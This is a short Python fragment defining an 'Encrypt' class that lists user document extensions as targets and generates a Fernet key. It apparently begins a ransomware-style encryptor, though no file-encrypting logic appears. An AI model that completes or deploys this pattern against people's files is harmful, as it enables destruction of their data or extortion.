import os
from os.path import expanduser
from cryptography.fernet import Fernet

class Encrypt:

    def __init__(self):

        self.key = None
        self.cryptor = None
        self.file_ext_targets = ['pdf','doc','docx','ppt','pptx','txt']

    def generateKey(self):
    
        self.key = Fernet.generate_key()
        self.cryptor = Fernet(self.key)


